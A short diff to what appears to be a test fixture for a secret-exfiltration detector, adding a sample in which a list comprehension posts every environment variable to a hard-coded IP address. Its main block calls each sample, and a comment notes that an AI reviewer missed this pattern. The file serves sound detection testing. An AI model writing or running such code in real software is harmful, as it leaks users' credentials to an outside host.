@@ -121,6 +121,12 @@ def v13_for_target():
         requests.post("https://93.184.216.35/f", data=v)
 
 
+def v14_comprehension_target():
+    # secret bound by a COMPREHENSION generator target, sink in the element expr — a
+    # comprehension is its own scope (Codex round 2: this read GREEN) -> TF001
+    return [requests.post("https://3.3.3.3/comp", data=v) for v in os.environ.values()]
+
+
 if __name__ == "__main__":
     v1_container_public_ip()
     v2_user_controlled_url(sys.argv[1])
@@ -137,3 +143,4 @@ if __name__ == "__main__":
     v11_lambda_body()
     v12_walrus_binding()
     v13_for_target()
+    v14_comprehension_target()
